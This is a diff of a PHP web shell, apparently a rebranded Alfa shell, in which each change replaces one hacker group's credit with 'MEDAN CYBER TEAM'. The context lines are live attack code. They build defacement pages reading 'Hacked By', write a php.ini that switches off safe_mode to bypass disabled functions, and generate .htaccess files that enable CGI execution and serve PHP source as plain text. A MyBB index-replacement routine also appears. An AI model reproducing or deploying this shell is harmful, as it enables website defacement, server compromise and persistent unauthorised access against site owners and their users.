@@ -1210,7 +1210,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/MCT" target="_blank"><span><font class="solevisible-text" color="#0F0">MCT & GarudaSecurity</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/MCT" target="_blank"><span><font class="solevisible-text" color="#0F0">MEDAN CYBER TEAM</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -1588,7 +1588,7 @@ $about_us = $news->Send("http://solevisible.com/aboutus.php");
 if(empty($about_us)){
 $about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
-<font color='#00A220'>Shell Coded By MCT & GarudaSecurity (Garsec TEaM)</font><br>
+<font color='#00A220'>Shell Coded By MEDAN CYBER TEAM (Garsec TEaM)</font><br>
 <font color='#00A220'>Contact : sukabintang84@gmail.com</font><br>
 <font color='#00A220'>Telegram Channel: @MCT</font><br>
 <font color='#FF0000'>Nikmati Hidup Tanpa Kopi bagaikan Bunga Tanpa Akar</font><br>
@@ -3462,7 +3462,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By MCT & GarudaSecurity</title><b>Hacked By MCT & GarudaSecurity</b></textarea><br>
+<textarea name=index rows='19' cols='103'><title>Hacked By MEDAN CYBER TEAM</title><b>Hacked By MEDAN CYBER TEAM</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['alfa6'])){
@@ -3519,7 +3519,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By MCT & GarudaSecurity</title><b>Hacked By MCT & GarudaSecurity</b></textarea><br>
+<textarea name='index' rows='19' cols='103'><title>Hacked By MEDAN CYBER TEAM</title><b>Hacked By MEDAN CYBER TEAM</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['alfa8']=='>>'){
 $s0levisible="Powered By Solevisible";
@@ -3563,7 +3563,7 @@ $table = array('td1' =>
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By MCT & GarudaSecurity</title><b>Hacked By MCT & GarudaSecurity</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
+<title>Hacked By MEDAN CYBER TEAM</title><b>Hacked By MEDAN CYBER TEAM</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
 if(isset($_POST['alfa6'])){
 $mybb_dbh = $_POST['alfa6'];
 $mybb_dbu = $_POST['alfa7'];
@@ -3708,7 +3708,7 @@ if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
 if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By MCT & GarudaSecurity(Garsec TEaM)");
+@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By MEDAN CYBER TEAM(Garsec TEaM)");
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
 if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
@@ -5261,9 +5261,9 @@ function alfacgihtaccess($m,$d='', $symname=false){
 $readme = "";
 if($symname){$readme="\nReadmeName ".trim($symname);}
 if($m=='cgi'){
-$code = "#Coded By MCT & GarudaSecurity\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .MCT\nAddHandler cgi-script .MCT";
+$code = "#Coded By MEDAN CYBER TEAM\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .MCT\nAddHandler cgi-script .MCT";
 }elseif($m=='sym'){
-$code = "#Coded By MCT & GarudaSecurity\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
+$code = "#Coded By MEDAN CYBER TEAM\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
